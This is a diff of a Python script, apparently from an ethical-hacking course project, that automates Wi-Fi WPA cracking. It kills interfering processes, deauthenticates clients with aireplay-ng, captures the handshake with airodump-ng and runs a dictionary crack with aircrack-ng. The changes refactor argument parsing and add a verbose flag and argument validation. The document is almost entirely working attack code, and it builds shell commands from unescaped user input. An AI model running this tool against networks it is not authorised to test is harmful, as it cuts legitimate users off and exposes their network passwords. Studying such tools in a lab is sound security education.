@@ -11,16 +11,12 @@ import csv # to read airodump output file
 
 ###############################################################
 # Specify directory to store temporary intercepted packets
-# Default: Creates directory "./packets"
+# Default: Dumps temporary data in current working directory (creates directory "./packets")
 packetPath = ""
 
 # Specify path to custom dictionary for cracking
 # Default: Uses included dictionary (if dictionary.txt exists)
 dictionaryPath = ""
-
-# Specify file to store passwords in
-# Default: Creates file "passwords.txt"
-passwordsPath = ""
 
 # Specify interface name of the monitor-mode-capable device you
 # would like to use.
@@ -32,10 +28,19 @@ interfaceName = ""
 # targetBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
 targetBSSID = ""
 
+# Specify access point readable name (ESSID) to target
+# Default: Present user with detected access points to choose from
+# targetBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
+targetESSID = ""
+
 # Specify channel to scan on
 # Default: Prompt user to choose channel or scan all channels
 # channel = "6"
 channel = ""
+
+# Verbose output flag
+# Default: False
+verbose = False
 ###############################################################
 
 
@@ -52,6 +57,7 @@ def main():
 	finally:
 		# this ensures that clean up occurs even on error
 		cleanUp()
+
 
 def is_valid_path(parser, arg):
     if not os.path.exists(arg):
@@ -81,47 +87,70 @@ class readable_dir(argparse.Action):
 def environmentSetup():
 	global packetPath
 	global dictionaryPath
-	global passwordsPath
 	global interfaceName
+	global targetBSSID
+	global targetESSID
+	global channel
+	global verbose
 
-	# Prep ArgumentParser
-	# ldir = tempfile.mkdtemp()
-	# atexit.register(lambda dir=ldir: shutil.rmtree(ldir))
+	# Parse arguments
+	parser = ArgumentParser()
+	args = parseArguments(parser)
 
-	# parser = ArgumentParser(description='test', fromfile_prefix_chars="@")
-	# parser.add_argument('--packetPath', action=readable_dir, default=ldir)
-	# parser.add_argument('--dictionaryPath', action=readable_dir, default=ldir) # How will this work?
-	# parser.add_argument('--passwordsPath', action=readable_dir, default=ldir)
-	# args = parser.parse_args()
+	# Make sure the user didn't pass anything spooky in
+	verifyArgs(args)
 
-	# read args, if any
-	args = list(sys.argv)
-	for i, arg in enumerate(args):
-		if i == 0:
-			continue
-		setGlobalAttribute(arg)
+	# Assign arguments to globals for ease of reference throughout program
+	if args.datadump:
+		packetPath = args.datadump
+	if args.dictionary:
+		dictionaryPath = args.dictionary
+	if args.interface:
+		interfaceName = args.interface
+	if args.mac:
+		targetBSSID = args.mac
+	if args.name:
+		targetESSID = args.name
+	if args.channel:
+		channel = args.channel
+	if args.verbose:
+		verbose = True
 
-	''' The following if statements will only execute if the user
-	user did NOT specify that particular attribute either global (in this file)
-	or via the commandline. '''
-	# use default path for packets	
+	''' DEFAULTS -
+	The following if statements will only execute if the user
+	user did NOT specify that particular attribute either globally
+	(in this file) or via the commandline. '''	
 	if not packetPath:
-		# create packets directory if it doesn't exist
+		# use default path for packet data dump
 		if not os.path.exists(os.getcwd() + "/packets"):
+			# create packets directory if it doesn't exist
 			os.makedirs(os.getcwd() + "/packets")
 		packetPath = os.getcwd() + "/packets/"
-	# use included dictionary
+
 	if not dictionaryPath:
-		if os.path.isfile(os.getcwd() + "/dictionary.txt"):
-			dictionaryPath = os.getcwd() + "/dictionary.txt"
-		else:
-			dictionaryPath = os.getcwd() + "/" + input("Please specify wordlist for dictionary crack: ")
-		while not os.path.isfile(dictionaryPath):
-			dictionaryPath = os.getcwd() + "/" + input(dictionaryPath + " does not exist. Please try again: ")
-	# use default passwords file
-	if not passwordsPath and os.path.isfile(os.getcwd() + "/passwords.txt"):
-		# TODO: Make passwords.txt file if there isn't one
-		passwordsPath = os.getcwd() + "/passwords.txt"
+		# prompt user to specify path to dictionary
+		while not dictionaryPath:
+			dp = input("Specify path to dictionary: ")
+
+			if len(dp) > 0 and dp.find('/', 0, 1) == 0:
+				# absolute path
+				if not os.path.isfile(dp):
+					print("Path to dictionary does not exist: " + dp)
+					continue
+			elif len(dp) > 0:
+				# relative path
+				dp = os.getcwd() + '/' + dp
+				if not os.path.isfile(dp):
+					print("Path to dictionary does not exist: " + dp)
+					continue
+			else:
+				# invalid input
+				print("Invalid input for dictionary path: " + dp)
+				continue
+
+			# valid path
+			dictionaryPath = dp
+			break
 
 	# get name of wireless interface to use
 	# getInterfaceName() should raise exception if no compatible device found
@@ -130,42 +159,67 @@ def environmentSetup():
 		interfaceName = getInterfaceName()
 
 
+def parseArguments(parser):
+	parser.add_argument('-p', '--datadump', help='Directory to store temporary data (intercepted packets)\n\
+						Default: dumps temporary data in current working directory', type=str)
+	parser.add_argument('-d', '--dictionary', help='Path to dictionary for aircrack to use\n\
+						Default: uses included dictionary (if dictionary.txt exists)', type=str) # How will this work?
+	parser.add_argument('-i', '--interface', help='Interface name of the monitor-mode-capable device you would like to use\n\
+						Default: searches for monitor-mode-capable devices at runtime', type=str)
+	parser.add_argument('-m', '--mac', help='Target access point MAC address (BSSID)\n\
+						Default: present user with detected access points to choose from', type=str)
+	parser.add_argument('-n', '--name', help='Target access point readable name (ESSID)\n\
+						Default: present user with detected access points to choose from', type=str)
+	parser.add_argument('-c', '--channel', help='Channel to scan on\n\
+						Default: prompt user to specify channel or scan all channels', type=str)
+	parser.add_argument('-v', '--verbose', help='Verbose output flag\n\
+						Default: False', action="store_true")
+
+	args = parser.parse_args()
+
+	return args
+
+
+def verifyArgs(args):
+	if args.datadump:
+		if not os.path.exists(args.datadump):
+			raise ValueError("Path for datadump not found: " + args.datadump)
+
+	if args.dictionary:
+		if not os.path.isfile(args.dictionary):
+			raise ValueError("Path for dictionary not found: " + args.dictionary)
+
+	if args.mac:
+		if not validMacAddress(args.mac):
+			raise ValueError("Invalid target MAC address format: " + args.mac)
+
+
 def killInterference():
+	global verbose
+
 	print("Killing potential interfering processes...")
 	process = bash_command("airmon-ng check kill")
-	print(process.stdout.read().decode('utf-8').strip())
-	# TODO: Handle error output
+
+	if verbose:
+		print(process.stdout.read().decode('utf-8').strip())
+	if process.stderr:
+		print(process.stderr)
 
 	print("Stopping avahi-daemon...")
 	process = bash_command("/etc/init.d/avahi-daemon stop")
-	print(process.stdout.read().decode('utf-8'))
-	# TODO: Handle error output
 
-	# TODO: Check for eth0 interface
-	# TODO: Is this necessary?
-	# Use 'ifconfig'
+	if verbose:
+		print(process.stdout.read().decode('utf-8'))
+	if process.stderr:
+		print(process.stderr)
+
 	print("Taking your eth0 down...")
 	process = bash_command("ifconfig eth0 down")
-	print(process.stdout.read().decode('utf-8'))
-	# TODO: Handle error output
 
-
-def setGlobalAttribute(arg):
-	attributeAndPath = arg.split('=')
-	attribute = attributeAndPath[0]
-	path = attributeAndPath[1]
-
-	if not os.path.exists(path):
-		raise ValueError("Path not found: " + path)
-
-	if attribute == 'packetPath':
-		packetPath = path
-	elif attribute == 'dictionaryPath':
-		dictionaryPath = path
-	elif attribute == 'passwordsPath':
-		passwordsPath = path
-	else:
-		raise ValueError("Invalid argument: " + attribute)
+	if verbose:
+		print(process.stdout.read().decode('utf-8'))
+	if process.stderr:
+		print(process.stderr)
 
 
 def getTargetAccessPoint():
@@ -373,18 +427,8 @@ def captureHandshake():
 
 		for client in client_list:
 			deauthenticateClient(client)
-			# Attempt 1
-			# if airodump_proc.stdout.read().decode('utf-8').contains("handshake"):
-			# 	print("Handshake captured.")
-			# 	airodump_proc.terminate()
-			# 	return
 
 		time.sleep(1)
-		# Attempt 2
-		# aircrackGrep = bash_command("aircrack-ng packet-01.cap | grep handshake > " + packetPath + "../check.txt", stderr=None)
-		# time.sleep(2)
-		# aircrackGrep.terminate()
-		# if aircrackGrep.stdout.read().decode('utf-8').contains("handshake"):
 
 		if time.time()-timeStart > int(scanTime):
 			break
@@ -392,8 +436,6 @@ def captureHandshake():
 	time.sleep(10)
 	print("Killing packet dump of AP: " + targetBSSID)
 	airodump_proc.terminate()
-	# if os.path.isfile(packetPath + "check.txt"): # part of Attempt 2
-		# assert(0)
 
 
 def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
@@ -459,6 +501,7 @@ def deauthenticateClient(clientMacAddress, targetESSID=None):
 			" " + interfaceName)
 	print(aireplay_proc.stdout.read().decode('utf-8').strip())
 
+
 def validMacAddress(address):
 	return re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", address.lower())
 
@@ -470,9 +513,11 @@ def crackHandshake():
 	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None)
 	process.wait()
 
+
 def cleanUp():
 	if os.path.exists(packetPath):
 		shutil.rmtree(packetPath)
+
 
 if __name__ == "__main__":
 	main()
